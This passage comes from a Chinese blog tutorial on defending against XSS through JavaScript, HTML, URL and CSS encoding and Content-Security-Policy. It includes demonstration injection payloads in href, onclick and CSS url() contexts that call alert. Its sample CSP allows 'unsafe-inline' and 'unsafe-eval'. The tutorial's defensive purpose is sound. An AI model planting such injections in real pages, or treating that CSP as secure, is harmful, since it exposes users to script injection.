  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如下demo演示：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;javascript:alert\x28\x27href\x20xss\x27\x29&quot;&lt;/span&gt;&lt;span&gt; target&lt;/span&gt;&lt;span&gt;=&quot;_blank&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Href XSS JavaScript编码&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; str &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;alert('href xss')&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForJavascript(str) {
      let encoded &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;(let i &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; i &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt; str.length; i&lt;/span&gt;&lt;span&gt;++&lt;/span&gt;&lt;span&gt;) {
        let cc &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; str[i];
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (&lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;[A-Za-z0-9]&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;.test(str[i]) &lt;/span&gt;&lt;span&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span&gt; str.charCodeAt(i) &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt; &lt;span&gt;256&lt;/span&gt;&lt;span&gt;) {
          hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;\\x&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; cc.charCodeAt().toString(&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;&lt;span&gt;);
        }
        encoded &lt;/span&gt;&lt;span&gt;+=&lt;/span&gt;&lt;span&gt; hex;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
    };
    console.log(encodeForJavascript(str)); &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; alert\x28\x27href\x20xss\x27\x29&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;现在我们再来点击上面的a链接是不会有任何效果的。因此 XSS执行失败; 当然对onclick 事件等其他的也是一样的要进行编码。我们也可以继续看下：onclick属性XSS&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;onclick属性XSS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如现在我们来看一下on事件属性：&amp;lt;div id=&quot;test&quot; onclick=&quot;testFunc($value)&quot;&amp;gt;xxs测试&amp;lt;/div&amp;gt; （此处的$value往往一般都是后台模板替换的变量）&amp;lt;div id=&quot;test&quot; onclick=&quot;testFunc('$value')&quot;&amp;gt;xxs测试&amp;lt;/div&amp;gt;&lt;/p&gt;
&lt;p&gt;当$value的值 hello world'),alert('onclick xss 时，就会触发XSS攻击；代码就会变成如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;test&quot;&lt;/span&gt;&lt;span&gt; onclick&lt;/span&gt;&lt;span&gt;=&quot;testFunc('hello world'),alert('onclick xss')&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;xxs测试&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;因此demo如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;test&quot;&lt;/span&gt;&lt;span&gt; onclick&lt;/span&gt;&lt;span&gt;=&quot;testFunc('hello world'),alert('onclick xss')&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;xxs测试&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; testFunc(xx) {
      
    }
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;当我点击xss测试的时候，就会变成如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522232557025-2127453.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果我们使用html编码是不行的，对$value进行HTML编码, 我们可以看看如下demo所示：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;test&quot;&lt;/span&gt;&lt;span&gt; onclick&lt;/span&gt;&lt;span&gt;=&quot;testFunc('hello&amp;amp;#x20;world&amp;amp;#x27;&amp;amp;#x29;&amp;amp;#x2c;alert&amp;amp;#x28;&amp;amp;#x27;onclick&amp;amp;#x20;xss')&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;xxs测试&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; testFunc() {}
    
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; str &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hello world'),alert('onclick xss&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html编码&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForHTMLAttibute(str) {
      let encoded &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;(let i &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; i &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt; str.length; i&lt;/span&gt;&lt;span&gt;++&lt;/span&gt;&lt;span&gt;) {
        let ch &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; str[i];
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (&lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;[A-Za-z0-9]&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;.test(str[i]) &lt;/span&gt;&lt;span&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span&gt; str.charCodeAt(i) &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt; &lt;span&gt;256&lt;/span&gt;&lt;span&gt;) {
          hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;#x&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; ch.charCodeAt(&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;).toString(&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
        }
        encoded &lt;/span&gt;&lt;span&gt;+=&lt;/span&gt;&lt;span&gt; hex;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
    };
    console.log(encodeForHTMLAttibute(str)); 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; hello&amp;amp;#x20;world&amp;amp;#x27;&amp;amp;#x29;&amp;amp;#x2c;alert&amp;amp;#x28;&amp;amp;#x27;onclick&amp;amp;#x20;xss&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如上代码，我们继续点击xxx测试的时候，还是可以弹窗的。&lt;/p&gt;
&lt;p&gt;现在如果我们继续将$value进行JavaScript编码：显示正常，不存在XSS。 如下代码所示：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;test&quot;&lt;/span&gt;&lt;span&gt; onclick&lt;/span&gt;&lt;span&gt;=&quot;testFunc('hello\x20world\x27\x29\x2calert\x28\x27onclick\x20xss')&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;xxs测试&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; testFunc() {}
    
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; str &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hello world'),alert('onclick xss&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html编码&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForJavascript(str) {
      let encoded &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;(let i &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; i &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt; str.length; i&lt;/span&gt;&lt;span&gt;++&lt;/span&gt;&lt;span&gt;) {
        let cc &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; str[i];
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (&lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;[A-Za-z0-9]&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;.test(str[i]) &lt;/span&gt;&lt;span&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span&gt; str.charCodeAt(i) &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt; &lt;span&gt;256&lt;/span&gt;&lt;span&gt;) {
          hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;\\x&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; cc.charCodeAt().toString(&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;&lt;span&gt;);
        }
        encoded &lt;/span&gt;&lt;span&gt;+=&lt;/span&gt;&lt;span&gt; hex;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
    };
    console.log(encodeForJavascript(str)); 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; hello\x20world\x27\x29\x2calert\x28\x27onclick\x20xss&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们继续点击就没有任何反应了，大家自己可以试试下。因此就不会存在xss攻击了。&lt;/p&gt;

&lt;p&gt;XSS 防御之 URL 编码&lt;/p&gt;
&lt;p&gt;作用范围：将不可信数据作为 URL 参数值时需要对参数进行 URL 编码&lt;br/&gt;编码规则：将参数值进行 encodeURIComponent 编码&lt;/p&gt;
&lt;p&gt;编码代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForURL(str){
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encodeURIComponent(str);
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;XSS 防御之 CSS 编码&lt;/p&gt;
&lt;p&gt;作用范围：将不可信数据作为 CSS 时进行 CSS 编码&lt;br/&gt;比如：通过css构造（background-img:url\expression\link-href@import）&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;=&quot;background-image: url(javascript:alert('xss'));&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;background-image&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt; url(&quot;javascript:alert('xss')&quot;)&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;}&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;style&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;编码规则：除了字母数字字符以外，使用\XXXXXX格式来转义ASCII值小于256的所有字符。 编码代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForCSS (attr, str){
  let encoded &lt;/span&gt;= ''&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (let i = 0; i &amp;lt; str.length; i++&lt;span&gt;) {
    let ch &lt;/span&gt;=&lt;span&gt; str.charAt(i);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!ch.match(/[a-zA-Z0-9]/&lt;span&gt;) {
      let hex &lt;/span&gt;= str.charCodeAt(i).toString(16&lt;span&gt;);
      let pad &lt;/span&gt;= '000000'&lt;span&gt;.substr((hex.length));
      encoded &lt;/span&gt;+= '\\' + pad +&lt;span&gt; hex;
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      encoded &lt;/span&gt;+=&lt;span&gt; ch;
    }
  }
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;开启CSP网页安全政策防止XSS攻击&lt;/p&gt;
&lt;p&gt;Content-Security-Policy 中文的意思是 网页安全政策，&lt;/p&gt;
&lt;p&gt;CSP是网页安全政策(Content Security Policy)的缩写。主要用来防止XSS攻击。是一种由开发者定义的安全性政策申明，通过CSP所约束的责任指定可信的内容来源，通过 Content-Security-Policy 网页的开发者可以控制整个页面中 外部资源 的加载和执行。&lt;br/&gt;比如可以控制哪些 域名下的静态资源可以被页面加载，哪些不能被加载。这样就可以很大程度的防范了 来自 跨站(域名不同) 的脚本攻击。&lt;/p&gt;
&lt;p&gt;如何使用呢？&lt;/p&gt;
&lt;p&gt;我们只需要在meta属性中设置下即可：如下代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;http-equiv&lt;/span&gt;&lt;span&gt;=&quot;Content-Security-Policy&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;比如如下的列子：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;http-equiv&lt;/span&gt;&lt;span&gt;=&quot;Content-Security-Policy&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;
default-src http: https:  *.xxx.com 'self' 'unsafe-inline' ;
style-src 'self' 'unsafe-inline' *.yyy.com;
script-src 'self' 'unsafe-inline' 'unsafe-eval' ;
&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;默认设置（default-src）：信任 http ,https协议资源，信任当前域名资源，信任符合*.xxx.com的域名资源CSS设置（style-src）：信任当前域名资源，允许内嵌的CSS资源，信任来自*.yyy.com下的CSS资源。&lt;br/&gt;JS设置（script-src）：信任当前域名资源，允许内嵌的JS执行，允许将字符串当作代码执行&lt;/p&gt;
&lt;p&gt;有如下类别&lt;/p&gt;
&lt;p&gt;default-src 给下面所有的规则设定一个默认值&lt;br/&gt;script-src 外部脚本&lt;br/&gt;style-src 样式表&lt;br/&gt;img-src 图像&lt;br/&gt;media-src 媒体文件（音频和视频）&lt;br/&gt;font-src 字体文件&lt;br/&gt;object-src 插件（比如 Flash）&lt;br/&gt;child-src 框架&lt;br/&gt;frame-ancestors 嵌入的外部资源（比如、&amp;lt;iframe&amp;gt;、和）&lt;br/&gt;connect-src HTTP 连接（通过 XHR、WebSockets、EventSource等）&lt;br/&gt;worker-src worker脚本&lt;br/&gt;manifest-src manifest 文件&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;script-src有如下属性值：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;unsafe-inline 允许执行页面内嵌的&amp;lt;script&amp;gt;标签和事件监听函数&lt;br/&gt;unsafe-eval 允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数&lt;br/&gt;nonce 每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行&lt;br/&gt;hash 列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行&lt;/p&gt;
</description>
